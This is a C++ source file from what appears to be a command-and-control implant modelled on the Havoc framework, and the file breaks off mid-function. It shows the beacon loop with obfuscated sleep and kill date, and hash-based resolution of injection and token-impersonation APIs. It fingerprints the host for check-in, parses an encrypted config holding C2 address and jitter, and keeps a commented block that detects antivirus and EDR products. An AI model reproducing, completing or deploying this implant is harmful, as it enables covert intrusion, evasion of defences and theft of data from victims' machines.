#include <core/include/base.hpp>

using namespace Xtea;
using namespace Opsec;
using namespace Parser;
using namespace Dispatcher;
using namespace Memory::Context;

// TODO: delegate functions and api separately to stager/payload
namespace Main {
    UINT8 RDATA Config[CONFIG_SIZE] = { 0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa, };

    VOID MainRoutine() {
        HEXANE;

        static int retry = 0;
        do {
            if (!ObfuscateSleep(nullptr, nullptr) ||
                !RuntimeChecks()) {
                break;
            }

            if (!CheckTime()) {
                continue;
            }
            if (!Ctx->session.checkin &&
                !Ctx->transport.message_queue) {
                if (!CheckEnvironment()) {
                    break;
                }
            }

            if (!DispatchRoutine()) {
                Ctx->session.retries++;
                if (retry == Ctx->session.retries) { 
                    break;
                }

                continue;
            }

            retry = 0;
        }
        while (ntstatus != ERROR_EXIT);
        ContextDestroy();
    }

	BOOL EnumSystem() {
		// resolve version : https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/Demon.c#L368
		HEXANE;
		
		_stream *out              = CreateStreamWithHeaders(TypeCheckin);
        IP_ADAPTER_INFO adapter   = { };
		OSVERSIONINFOW os_version = { };

		BOOL success             = true;
        DWORD length             = MAX_PATH;
        CHAR buffer[MAX_PATH]    = { };
        
        x_ntassertb(Ctx->nt.RtlGetVersion(&os_version));
		
        Ctx->Session.Version = WIN_VERSION_UNKNOWN;
        os_version.dwOSVersionInfoSize = sizeof(os_version);
		
        if (os_version.dwMajorVersion >= 5) {
            if (os_version.dwMajorVersion == 5) {
                if (os_version.dwMinorVersion == 1) {
                    Ctx->session.version = WIN_VERSION_XP;
                }
            }
            else if (os_version.dwMajorVersion == 6) {
                if (os_version.dwMinorVersion == 0) {
                    Ctx->session.version = WIN_VERSION_2008;
                }
                else if (os_version.dwMinorVersion == 1) {
                    Ctx->session.version = WIN_VERSION_2008_R2;
                }
                else if (os_version.dwMinorVersion == 2) {
                    Ctx->session.version = WIN_VERSION_2012;
                }
                else if (os_version.dwMinorVersion == 3) {
                    Ctx->session.version = WIN_VERSION_2012_R2;
                }
            }
            else if (os_version.dwMajorVersion == 10) {
                if (os_version.dwMinorVersion == 0) {
                    Ctx->session.version = WIN_VERSION_2016_X;
                }
            }
        }

        if (Ctx->win32.GetComputerNameExA(ComputerNameNetBIOS, (LPSTR) buffer, &length)) {
            if (Ctx->config.hostname[0]) {
                if (MbsBoundCompare(buffer, Ctx->config.hostname, MbsLength(Ctx->config.hostname)) != 0) {
                    return false;
                }
            }
            PackString(out, buffer);
        }
        else {
            PackUint32(out, 0);
        }

        MemSet(buffer, 0, MAX_PATH);
        length = MAX_PATH;

        if (Ctx->win32.GetComputerNameExA(ComputerNameDnsDomain, (LPSTR) buffer, &length)) {
            if (Ctx->transport.domain[0]) {
                if (MbsBoundCompare(Ctx->transport.domain, buffer, MbsLength(Ctx->transport.domain)) != 0) {
                    return false;
                }
            }
            PackString(out, buffer);
        }
        else {
            PackUint32(out, 0);
        }

        MemSet(buffer, 0, MAX_PATH);
        length = MAX_PATH;

        if (Ctx->win32.GetUserNameA((LPSTR) buffer, &length)) {
            PackString(out, buffer);
        }
        else {
            PackUint32(out, 0);
        }

        MemSet(buffer, 0, MAX_PATH);
        length = sizeof(IP_ADAPTER_INFO);

        if (Ctx->win32.GetAdaptersInfo(&adapter, &length) == NO_ERROR) {
            PackString(out, adapter.IpAddressList.IpAddress.String);
        }
        else {
            PackUint32(out, 0);
        }

        MemSet(&adapter, 0, sizeof(IP_ADAPTER_INFO));

	/* TODO:
		#include <stdio.h>
		#include <windows.h>
		#include <tlhelp32.h>
		#include <evntrace.h>
		#include <evntcons.h>

		// Function prototypes
		void CheckRegistryKey(HKEY rootKey, const char* subKey);
		void CheckService(const char* serviceName);
		void CheckProcess(const char* processName);
		void CheckETWProviders();
		void CheckForSecurityProducts();

		void CheckRegistryKey(HKEY rootKey, const char* subKey) {
			HKEY hKey;
			if (RegOpenKeyExA(rootKey, subKey, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
				printf("Registry key %s exists.\n", subKey);
				RegCloseKey(hKey);
			} else {
				if (GetLastError() == ERROR_ACCESS_DENIED) {
					printf("Insufficient permissions to access registry key %s.\n", subKey);
				} else {
					printf("Registry key %s does not exist.\n", subKey);
				}
			}
		}

		void CheckService(const char* serviceName) {
			SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
			if (scmHandle) {
				SC_HANDLE serviceHandle = OpenService(scmHandle, serviceName, SERVICE_QUERY_STATUS);
				if (serviceHandle) {
					SERVICE_STATUS serviceStatus;
					if (QueryServiceStatus(serviceHandle, &serviceStatus)) {
						if (serviceStatus.dwCurrentState == SERVICE_RUNNING) {
							printf("Service %s is running.\n", serviceName);
						} else {
							printf("Service %s is not running.\n", serviceName);
						}
					} else {
						printf("Failed to query service status for %s.\n", serviceName);
					}
					CloseServiceHandle(serviceHandle);
				} else {
					if (GetLastError() == ERROR_ACCESS_DENIED) {
						printf("Insufficient permissions to access service %s.\n", serviceName);
					} else {
						printf("Service %s does not exist.\n", serviceName);
					}
				}
				CloseServiceHandle(scmHandle);
			} else {
				printf("Failed to open service manager.\n");
			}
		}

void CheckProcess(const char* processName) {
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_PROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        printf("CreateToolhelp32Snapshot failed\n");
        return;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hProcessSnap, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                printf("Process %s is running.\n", processName);
                CloseHandle(hProcessSnap);
                return;
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }
    CloseHandle(hProcessSnap);
    printf("Process %s is not running.\n", processName);
}

void CheckETWProviders() {
    // Array of ETW provider GUIDs for common security products
    const GUID* providers[] = {
        &GUID_DEVLOAD,                  // Example GUID for device load events (replace with actual product GUIDs)
        &GUID_CIM,                      // Example GUID (replace with actual product GUIDs)
        // Add more relevant GUIDs here for specific security products
    };

    printf("Checking for ETW providers...\n");

    for (int i = 0; i < sizeof(providers) / sizeof(providers[0]); i++) {
        // Start an ETW trace session to check for active providers
        EVENT_TRACE_PROPERTIES* pTraceProperties = (EVENT_TRACE_PROPERTIES*)malloc(sizeof(EVENT_TRACE_PROPERTIES) + 64);
        memset(pTraceProperties, 0, sizeof(EVENT_TRACE_PROPERTIES) + 64);
        pTraceProperties->Wnode.BufferSize = sizeof(EVENT_TRACE_PROPERTIES) + 64;
        pTraceProperties->Wnode.Guid = *providers[i];
        pTraceProperties->Wnode.ClientContext = 1; // Kernel mode context

        TRACEHANDLE traceHandle;
        ULONG status = StartTrace(&traceHandle, "MyTraceSession", pTraceProperties);

        if (status == ERROR_SUCCESS) {
            printf("ETW provider %s is enabled.\n", providers[i]);
            StopTrace(traceHandle, pTraceProperties->Wnode.Guid);
        } else {
            if (status == ERROR_ACCESS_DENIED) {
                printf("Insufficient permissions to access ETW provider %s.\n", providers[i]);
            } else {
                printf("ETW provider %s is not enabled or does not exist.\n", providers[i]);
            }
        }
        free(pTraceProperties);
    }
}

void CheckForSecurityProducts() {
    printf("Checking for security products...\n");

    // Kaspersky
    CheckRegistryKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\KasperskyLab");
    CheckService("AVP"); // Kaspersky Antivirus service
    CheckProcess("avp.exe");

    // Microsoft Defender for Endpoint
    CheckRegistryKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Microsoft Defender");
    CheckService("Sense"); // MDE service
    CheckProcess("MsSense.exe");

    // Symantec Endpoint Protection
    CheckRegistryKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Symantec\\Symantec Endpoint Protection");
    CheckService("SepMasterService"); // SEP service
    CheckProcess("ccsvchst.exe");

    // McAfee Endpoint Security
    CheckRegistryKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\McAfee\\Endpoint Security");
    CheckService("McShield"); // McAfee service
    CheckProcess("McShield.exe");

    // ETW-TI provider check
    CheckETWProviders();

    printf("Note: This program checks for specific security products and their ETW providers.\n");

        }


		*/

    defer:
        Dispatcher::MessageQueue(out);
        return success;
    }

    BOOL ResolveApi() {
		// TODO: create separate ResolveApi for loader and payload
		HEXANE;

        bool success = true;
        x_assertb(Ctx->modules.kernel32 = (HMODULE) M_PTR(KERNEL32));
        x_assertb(Ctx->modules.kernbase = (HMODULE) M_PTR(KERNELBASE));

        x_assertb(F_PTR_HASHES(Ctx->nt.RtlGetVersion, NTDLL, RTLGETVERSION));

#if defined(PAYLOAD)
// httpapi
// pipeapi
// enumapi
// memapi
// heapapi
// utilapi
// procapi
// ioapi
// secapi

#elif defined(STAGER)
// TODO: stager does not need everything and can reduce size by omitting certain api structs
// httpapi
// enumapi
// memapi
// heapapi
// procapi
// secapi
// EnumSystem
#endif

        x_assertb(F_PTR_HMOD(Ctx->nt.NtDelayExecution,              Ctx->modules.ntdll, NTDELAYEXECUTION));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtCreateEvent,                 Ctx->modules.ntdll, NTCREATEEVENT));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtQueueApcThread,              Ctx->modules.ntdll, NTQUEUEAPCTHREAD));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtContinue,                    Ctx->modules.ntdll, NTCONTINUE));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtAlertResumeThread,           Ctx->modules.ntdll, NTALERTRESUMETHREAD));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtSignalAndWaitForSingleObject, Ctx->modules.ntdll, NTSIGNALANDWAITFORSINGLEOBJECT));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtFreeVirtualMemory,           Ctx->modules.ntdll, NTFREEVIRTUALMEMORY));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtAllocateVirtualMemory,       Ctx->modules.ntdll, NTALLOCATEVIRTUALMEMORY));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtProtectVirtualMemory,        Ctx->modules.ntdll, NTPROTECTVIRTUALMEMORY));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtReadVirtualMemory,           Ctx->modules.ntdll, NTREADVIRTUALMEMORY));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtWriteVirtualMemory,          Ctx->modules.ntdll, NTWRITEVIRTUALMEMORY));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtQueryVirtualMemory,          Ctx->modules.ntdll, NTQUERYVIRTUALMEMORY));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtCreateSection,               Ctx->modules.ntdll, NTCREATESECTION));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtMapViewOfSection,            Ctx->modules.ntdll, NTMAPVIEWOFSECTION));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtUnmapViewOfSection,          Ctx->modules.ntdll, NTUNMAPVIEWOFSECTION));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtOpenProcess,                 Ctx->modules.ntdll, NTOPENPROCESS));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtCreateUserProcess,           Ctx->modules.ntdll, NTCREATEUSERPROCESS));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtTerminateProcess,            Ctx->modules.ntdll, NTTERMINATEPROCESS));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtTerminateThread,             Ctx->modules.ntdll, NTTERMINATETHREAD));
        x_assertb(F_PTR_HMOD(Ctx->nt.RtlCreateProcessParametersEx,  Ctx->modules.ntdll, RTLCREATEPROCESSPARAMETERSEX));
        x_assertb(F_PTR_HMOD(Ctx->nt.RtlDestroyProcessParameters,   Ctx->modules.ntdll, RTLDESTROYPROCESSPARAMETERS));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtOpenProcessToken,            Ctx->modules.ntdll, NTOPENPROCESSTOKEN));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtOpenThreadToken,             Ctx->modules.ntdll, NTOPENTHREADTOKEN));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtDuplicateToken,              Ctx->modules.ntdll, NTDUPLICATETOKEN));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtDuplicateObject,             Ctx->modules.ntdll, NTDUPLICATEOBJECT));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtQueryInformationToken,       Ctx->modules.ntdll, NTQUERYINFORMATIONTOKEN));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtQueryInformationProcess,     Ctx->modules.ntdll, NTQUERYINFORMATIONPROCESS));
        x_assertb(F_PTR_HMOD(Ctx->nt.RtlCreateHeap,                 Ctx->modules.ntdll, RTLCREATEHEAP));
        x_assertb(F_PTR_HMOD(Ctx->nt.RtlAllocateHeap,               Ctx->modules.ntdll, RTLALLOCATEHEAP));
        x_assertb(F_PTR_HMOD(Ctx->nt.RtlReAllocateHeap,             Ctx->modules.ntdll, RTLREALLOCATEHEAP));
        x_assertb(F_PTR_HMOD(Ctx->nt.RtlFreeHeap,                   Ctx->modules.ntdll, RTLFREEHEAP));
        x_assertb(F_PTR_HMOD(Ctx->nt.RtlDestroyHeap,                Ctx->modules.ntdll, RTLDESTROYHEAP));
        x_assertb(F_PTR_HMOD(Ctx->nt.RtlInitUnicodeString,          Ctx->modules.ntdll, RTLINITUNICODESTRING));
        x_assertb(F_PTR_HMOD(Ctx->nt.RtlAddVectoredExceptionHandler, Ctx->modules.ntdll, RTLADDVECTOREDEXCEPTIONHANDLER));
        x_assertb(F_PTR_HMOD(Ctx->nt.RtlRemoveVectoredExceptionHandler, Ctx->modules.ntdll, RTLREMOVEVECTOREDEXCEPTIONHANDLER));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtCreateThreadEx,              Ctx->modules.ntdll, NTCREATETHREADEX));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtDeviceIoControlFile,         Ctx->modules.ntdll, NTDEVICEIOCONTROLFILE));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtOpenFile,                    Ctx->modules.ntdll, NTOPENFILE));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtOpenThread,                  Ctx->modules.ntdll, NTOPENTHREAD));
        x_assertb(F_PTR_HMOD(Ctx->nt.RtlRandomEx,                   Ctx->modules.ntdll, RTLRANDOMEX));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtResumeThread,                Ctx->modules.ntdll, NTRESUMETHREAD));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtGetContextThread,            Ctx->modules.ntdll, NTGETCONTEXTTHREAD));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtSetContextThread,            Ctx->modules.ntdll, NTSETCONTEXTTHREAD));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtSetInformationThread,        Ctx->modules.ntdll, NTSETINFORMATIONTHREAD));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtWaitForSingleObject,         Ctx->modules.ntdll, NTWAITFORSINGLEOBJECT));
        x_assertb(F_PTR_HMOD(Ctx->nt.TpAllocWork,                   Ctx->modules.ntdll, TPALLOCWORK));
        x_assertb(F_PTR_HMOD(Ctx->nt.TpPostWork,                    Ctx->modules.ntdll, TPPOSTWORK));
        x_assertb(F_PTR_HMOD(Ctx->nt.TpReleaseWork,                 Ctx->modules.ntdll, TPRELEASEWORK));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtTestAlert,                   Ctx->modules.ntdll, NTTESTALERT));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtClose,                       Ctx->modules.ntdll, NTCLOSE));
        x_assertb(F_PTR_HMOD(Ctx->nt.RtlGetVersion,                 Ctx->modules.ntdll, RTLGETVERSION));
        x_assertb(F_PTR_HMOD(Ctx->nt.NtQuerySystemInformation,      Ctx->modules.ntdll, NTQUERYSYSTEMINFORMATION));

		x_assertb(F_PTR_HMOD(Ctx->nt.SetProcessValidCallTargets,         Ctx->modules.kernbase, SETPROCESSVALIDCALLTARGETS));
        x_assertb(F_PTR_HMOD(Ctx->win32.FreeLibrary,                     Ctx->modules.kernel32, FREELIBRARY));
        x_assertb(F_PTR_HMOD(Ctx->win32.Heap32ListFirst,                 Ctx->modules.kernel32, HEAP32LISTFIRST));
        x_assertb(F_PTR_HMOD(Ctx->win32.Heap32ListNext,                  Ctx->modules.kernel32, HEAP32LISTNEXT));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetProcessHeap,                  Ctx->modules.kernel32, GETPROCESSHEAP));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetProcessHeaps,                 Ctx->modules.kernel32, GETPROCESSHEAPS));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetProcAddress,                  Ctx->modules.kernel32, GETPROCADDRESS));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetModuleHandleA,                Ctx->modules.kernel32, GETMODULEHANDLEA));
        x_assertb(F_PTR_HMOD(Ctx->win32.IsWow64Process,                  Ctx->modules.kernel32, ISWOW64PROCESS));
        x_assertb(F_PTR_HMOD(Ctx->win32.OpenProcess,                     Ctx->modules.kernel32, OPENPROCESS));
        x_assertb(F_PTR_HMOD(Ctx->win32.CreateToolhelp32Snapshot,        Ctx->modules.kernel32, CREATETOOLHELP32SNAPSHOT));
        x_assertb(F_PTR_HMOD(Ctx->win32.Process32First,                  Ctx->modules.kernel32, PROCESS32FIRST));
        x_assertb(F_PTR_HMOD(Ctx->win32.Process32Next,                   Ctx->modules.kernel32, PROCESS32NEXT));
        x_assertb(F_PTR_HMOD(Ctx->win32.Module32First,                   Ctx->modules.kernel32, MODULE32FIRST));
        x_assertb(F_PTR_HMOD(Ctx->win32.Module32Next,                    Ctx->modules.kernel32, MODULE32NEXT));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetCurrentProcessId,             Ctx->modules.kernel32, GETCURRENTPROCESSID));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetProcessId,                    Ctx->modules.kernel32, GETPROCESSID));
        x_assertb(F_PTR_HMOD(Ctx->win32.GlobalMemoryStatusEx,            Ctx->modules.kernel32, GLOBALMEMORYSTATUSEX));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetComputerNameExA,              Ctx->modules.kernel32, GETCOMPUTERNAMEEXA));
        x_assertb(F_PTR_HMOD(Ctx->win32.SetLastError,                    Ctx->modules.kernel32, SETLASTERROR));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetLastError,                    Ctx->modules.kernel32, GETLASTERROR));
        x_assertb(F_PTR_HMOD(Ctx->win32.RegOpenKeyExA,                   Ctx->modules.kernel32, REGOPENKEYEXA));
        x_assertb(F_PTR_HMOD(Ctx->win32.RegCreateKeyExA,                 Ctx->modules.kernel32, REGCREATEKEYEXA));
        x_assertb(F_PTR_HMOD(Ctx->win32.RegSetValueExA,                  Ctx->modules.kernel32, REGSETVALUEEXA));
        x_assertb(F_PTR_HMOD(Ctx->win32.RegCloseKey,                     Ctx->modules.kernel32, REGCLOSEKEY));
        x_assertb(F_PTR_HMOD(Ctx->win32.ReadFile,                        Ctx->modules.kernel32, READFILE));
        x_assertb(F_PTR_HMOD(Ctx->win32.WriteFile,                       Ctx->modules.kernel32, WRITEFILE));
        x_assertb(F_PTR_HMOD(Ctx->win32.CreateFileW,                     Ctx->modules.kernel32, CREATEFILEW));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetFileSizeEx,                   Ctx->modules.kernel32, GETFILESIZEEX));
        x_assertb(F_PTR_HMOD(Ctx->win32.SetFilePointer,                  Ctx->modules.kernel32, SETFILEPOINTER));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetFullPathNameA,                Ctx->modules.kernel32, GETFULLPATHNAMEA));
        x_assertb(F_PTR_HMOD(Ctx->win32.FindFirstFileA,                  Ctx->modules.kernel32, FINDFIRSTFILEA));
        x_assertb(F_PTR_HMOD(Ctx->win32.FindClose,                       Ctx->modules.kernel32, FINDCLOSE));
        x_assertb(F_PTR_HMOD(Ctx->win32.FindNextFileA,                   Ctx->modules.kernel32, FINDNEXTFILEA));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetCurrentDirectoryA,            Ctx->modules.kernel32, GETCURRENTDIRECTORYA));
        x_assertb(F_PTR_HMOD(Ctx->win32.FileTimeToSystemTime,            Ctx->modules.kernel32, FILETIMETOSYSTEMTIME));
        x_assertb(F_PTR_HMOD(Ctx->win32.SystemTimeToTzSpecificLocalTime, Ctx->modules.kernel32, SYSTEMTIMETOTZSPECIFICLOCALTIME));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetLocalTime,                    Ctx->modules.kernel32, GETLOCALTIME));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetSystemTimeAsFileTime,         Ctx->modules.kernel32, GETSYSTEMTIMEASFILETIME));
        x_assertb(F_PTR_HMOD(Ctx->win32.FormatMessageA,                  Ctx->modules.kernel32, FORMATMESSAGEA));
        x_assertb(F_PTR_HMOD(Ctx->win32.CreateRemoteThread,              Ctx->modules.kernel32, CREATEREMOTETHREAD));
        x_assertb(F_PTR_HMOD(Ctx->win32.CreateThread,                    Ctx->modules.kernel32, CREATETHREAD));
        x_assertb(F_PTR_HMOD(Ctx->win32.ExitThread,                      Ctx->modules.kernel32, EXITTHREAD));
        x_assertb(F_PTR_HMOD(Ctx->win32.QueueUserAPC,                    Ctx->modules.kernel32, QUEUEUSERAPC));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetThreadLocale,                 Ctx->modules.kernel32, GETTHREADLOCALE));
        x_assertb(F_PTR_HMOD(Ctx->win32.SleepEx,                         Ctx->modules.kernel32, SLEEPEX));
        x_assertb(F_PTR_HMOD(Ctx->win32.FindResourceA,                   Ctx->modules.kernel32, FINDRESOURCEA));
        x_assertb(F_PTR_HMOD(Ctx->win32.LoadResource,                    Ctx->modules.kernel32, LOADRESOURCE));
        x_assertb(F_PTR_HMOD(Ctx->win32.LockResource,                    Ctx->modules.kernel32, LOCKRESOURCE));
        x_assertb(F_PTR_HMOD(Ctx->win32.SizeofResource,                  Ctx->modules.kernel32, SIZEOFRESOURCE));
        x_assertb(F_PTR_HMOD(Ctx->win32.FreeResource,                    Ctx->modules.kernel32, FREERESOURCE));
        x_assertb(F_PTR_HMOD(Ctx->win32.CallNamedPipeW,                  Ctx->modules.kernel32, CALLNAMEDPIPEW));
        x_assertb(F_PTR_HMOD(Ctx->win32.CreateNamedPipeW,                Ctx->modules.kernel32, CREATENAMEDPIPEW));
        x_assertb(F_PTR_HMOD(Ctx->win32.WaitNamedPipeW,                  Ctx->modules.kernel32, WAITNAMEDPIPEW));
        x_assertb(F_PTR_HMOD(Ctx->win32.SetNamedPipeHandleState,         Ctx->modules.kernel32, SETNAMEDPIPEHANDLESTATE));
        x_assertb(F_PTR_HMOD(Ctx->win32.ConnectNamedPipe,                Ctx->modules.kernel32, CONNECTNAMEDPIPE));
        x_assertb(F_PTR_HMOD(Ctx->win32.TransactNamedPipe,               Ctx->modules.kernel32, TRANSACTNAMEDPIPE));
        x_assertb(F_PTR_HMOD(Ctx->win32.DisconnectNamedPipe,             Ctx->modules.kernel32, DISCONNECTNAMEDPIPE));
        x_assertb(F_PTR_HMOD(Ctx->win32.PeekNamedPipe,                   Ctx->modules.kernel32, PEEKNAMEDPIPE));
        x_assertb(F_PTR_HMOD(Ctx->win32.WinHttpOpen,                     Ctx->modules.winhttp, WINHTTPOPEN));
        x_assertb(F_PTR_HMOD(Ctx->win32.WinHttpConnect,                  Ctx->modules.winhttp, WINHTTPCONNECT));
        x_assertb(F_PTR_HMOD(Ctx->win32.WinHttpOpenRequest,              Ctx->modules.winhttp, WINHTTPOPENREQUEST));
        x_assertb(F_PTR_HMOD(Ctx->win32.WinHttpAddRequestHeaders,        Ctx->modules.winhttp, WINHTTPADDREQUESTHEADERS));
        x_assertb(F_PTR_HMOD(Ctx->win32.WinHttpSetOption,                Ctx->modules.winhttp, WINHTTPSETOPTION));
        x_assertb(F_PTR_HMOD(Ctx->win32.WinHttpGetProxyForUrl,           Ctx->modules.winhttp, WINHTTPGETPROXYFORURL));
        x_assertb(F_PTR_HMOD(Ctx->win32.WinHttpGetIEProxyConfigForCurrentUser, Ctx->modules.winhttp, WINHTTPGETIEPROXYCONFIGFORCURRENTUSER));
        x_assertb(F_PTR_HMOD(Ctx->win32.WinHttpSendRequest,              Ctx->modules.winhttp, WINHTTPSENDREQUEST));
        x_assertb(F_PTR_HMOD(Ctx->win32.WinHttpReceiveResponse,          Ctx->modules.winhttp, WINHTTPRECEIVERESPONSE));
        x_assertb(F_PTR_HMOD(Ctx->win32.WinHttpReadData,                 Ctx->modules.winhttp, WINHTTPREADDATA));
        x_assertb(F_PTR_HMOD(Ctx->win32.WinHttpQueryHeaders,             Ctx->modules.winhttp, WINHTTPQUERYHEADERS));
        x_assertb(F_PTR_HMOD(Ctx->win32.WinHttpQueryDataAvailable,       Ctx->modules.winhttp, WINHTTPQUERYDATAAVAILABLE));
        x_assertb(F_PTR_HMOD(Ctx->win32.WinHttpCloseHandle,              Ctx->modules.winhttp, WINHTTPCLOSEHANDLE));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetAdaptersInfo,                 Ctx->modules.iphlpapi, GETADAPTERSINFO));
        x_assertb(F_PTR_HMOD(Ctx->win32.CryptStringToBinaryA,            Ctx->modules.crypt32, CRYPTSTRINGTOBINARYA));
        x_assertb(F_PTR_HMOD(Ctx->win32.CryptBinaryToStringA,            Ctx->modules.crypt32, CRYPTBINARYTOSTRINGA));
        x_assertb(F_PTR_HMOD(Ctx->win32.AdjustTokenPrivileges,           Ctx->modules.advapi, ADJUSTTOKENPRIVILEGES));
        x_assertb(F_PTR_HMOD(Ctx->win32.ImpersonateLoggedOnUser,         Ctx->modules.advapi, IMPERSONATELOGGEDONUSER));
        x_assertb(F_PTR_HMOD(Ctx->win32.GetUserNameA,                    Ctx->modules.advapi, GETUSERNAMEA));
        x_assertb(F_PTR_HMOD(Ctx->win32.LookupAccountSidW,               Ctx->modules.advapi, LOOKUPACCOUNTSIDW));
        x_assertb(F_PTR_HMOD(Ctx->win32.LookupPrivilegeValueA,           Ctx->modules.advapi, LOOKUPPRIVILEGEVALUEA));
        x_assertb(F_PTR_HMOD(Ctx->win32.SetEntriesInAclA,                Ctx->modules.advapi, SETENTRIESINACLA));
        x_assertb(F_PTR_HMOD(Ctx->win32.AllocateAndInitializeSid,        Ctx->modules.advapi, ALLOCATEANDINITIALIZESID));
        x_assertb(F_PTR_HMOD(Ctx->win32.AddMandatoryAce,                 Ctx->modules.advapi, ADDMANDATORYACE));
        x_assertb(F_PTR_HMOD(Ctx->win32.InitializeSecurityDescriptor,    Ctx->modules.advapi, INITIALIZESECURITYDESCRIPTOR));
        x_assertb(F_PTR_HMOD(Ctx->win32.SetSecurityDescriptorDacl,       Ctx->modules.advapi, SETSECURITYDESCRIPTORDACL));
        x_assertb(F_PTR_HMOD(Ctx->win32.SetSecurityDescriptorSacl,       Ctx->modules.advapi, SETSECURITYDESCRIPTORSACL));
        x_assertb(F_PTR_HMOD(Ctx->win32.InitializeAcl,                   Ctx->modules.advapi, INITIALIZEACL));
        x_assertb(F_PTR_HMOD(Ctx->win32.FreeSid,                         Ctx->modules.advapi, FREESID));

        defer:
        return success;
    }

    BOOL ReadConfig() {
        HEXANE;

        _parser parser  = { };
        bool success    = true;

        CreateParser(&parser, Config, sizeof(Config));
        MemSet(Config, 0, sizeof(Config));

        Ctx->session.peer_id = UnpackUint32(&parser);
        ParserMemcpy(&parser, &Ctx->config.session_key, nullptr);

        if (ENCRYPTED) {
            XteaCrypt(B_PTR(parser.buffer), parser.Length, Ctx->config.session_key, false);
        }

        ParserStrcpy(&parser, &Ctx->config.hostname, nullptr);

        Ctx->session.retries        = UnpackUint32(&parser);
        Ctx->config.working_hours   = UnpackUint32(&parser);
        Ctx->config.kill_date       = UnpackUint64(&parser);
        Ctx->config.sleeptime       = UnpackUint32(&parser);
        Ctx->config.jitter          = UnpackUint32(&parser);

        // TODO: add dll manual mapping: https://github.com/bats3c/DarkLoadLibrary

        if (F_PTR_HMOD(Ctx->win32.LoadLibraryA, Ctx->modules.kernel32, LOADLIBRARYA)) {
            x_assertb(Ctx->modules.crypt32  = Ctx->win32.LoadLibraryA(UnpackString(&parser, nullptr)));
            x_assertb(Ctx->modules.winhttp  = Ctx->win32.LoadLibraryA(UnpackString(&parser, nullptr)));
            x_assertb(Ctx->modules.advapi   = Ctx->win32.LoadLibraryA(UnpackString(&parser, nullptr)));
            x_assertb(Ctx->modules.iphlpapi = Ctx->win32.LoadLibraryA(UnpackString(&parser, nullptr)));
            x_assertb(Ctx->modules.mscoree  = Ctx->win32.LoadLibraryA(UnpackString(&parser, nullptr)));
        }
        else {
            success = false;
            goto defer;
        }

        Ctx->transport.message_queue = nullptr;
		
#ifdef TRANSPORT_HTTP
        Ctx->transport.http = (_http_context*) Malloc(sizeof(_http_context));

        Ctx->transport.http->handle     = nullptr;
        Ctx->transport.http->endpoints  = nullptr;
        Ctx->transport.http->headers    = nullptr;

        ParserWcscpy(&parser, &Ctx->transport.http->useragent, nullptr);
        ParserWcscpy(&parser, &Ctx->transport.http->address, nullptr  );
        Ctx->transport.http->port = (int) UnpackUint32(&parser);
        ParserStrcpy(&parser, &Ctx->transport.domain, nullptr);

        Ctx->transport.http->n_endpoints = UnpackUint32(&parser);
        Ctx->transport.http->endpoints  = (wchar_t**) Malloc(sizeof(wchar_t*) * ((Ctx->transport.http->n_endpoints + 1)));

        for (auto i = 0; i < Ctx->transport.http->n_endpoints; i++) {
            ParserWcscpy(&parser, &Ctx->transport.http->endpoints[i], nullptr);
        }

